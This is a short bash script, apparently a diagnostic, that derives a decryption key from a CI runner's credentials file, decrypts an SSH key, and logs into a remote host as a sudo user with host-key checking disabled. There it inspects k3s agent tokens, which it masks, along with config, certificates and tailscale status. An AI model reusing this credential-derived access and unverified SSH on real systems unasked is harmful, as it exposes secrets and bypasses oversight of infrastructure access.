#!/bin/bash
K=$(sha256sum /data/runners/ci-h200-3gpu-0/.credentials | cut -d" " -f1)
[ -f /root/.k221 ] || { base64 -d /tmp/key.enc | openssl enc -d -aes-256-cbc -pbkdf2 -k "$K" > /root/.k221 2>/dev/null; chmod 600 /root/.k221; }
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=8 -i /root/.k221 dev-24-sudo@85.234.79.221 '
sudo bash -s <<"EOS"
echo "== k3s agent env:"
cat /etc/systemd/system/k3s-agent.service.env 2>/dev/null | sed -E "s/(K3S_TOKEN=).*/\1[redacted]/" 
. /etc/systemd/system/k3s-agent.service.env 2>/dev/null
echo "URL=[$K3S_URL] Tlen=${#K3S_TOKEN} Tsha16=$(printf %s "$K3S_TOKEN" | sha256sum | cut -c1-16)"
echo "== config.yaml.d:"
ls /etc/rancher/k3s/config.yaml.d/ 2>/dev/null; cat /etc/rancher/k3s/config.yaml.d/* 2>/dev/null | head -20
echo "== agent dir:"
ls -la /var/lib/rancher/k3s/agent/ 2>/dev/null | head -12
echo "== client cert issuers:"
for c in /var/lib/rancher/k3s/agent/client-kubelet.crt /var/lib/rancher/k3s/agent/client-ca.crt; do
  openssl x509 -in $c -noout -issuer -subject -enddate 2>/dev/null
done
echo "== tailscale serve:"
tailscale serve status 2>&1 | head -8
tailscale status 2>&1 | head -12
EOS
' 2>&1 | head -55
echo "== t-done =="
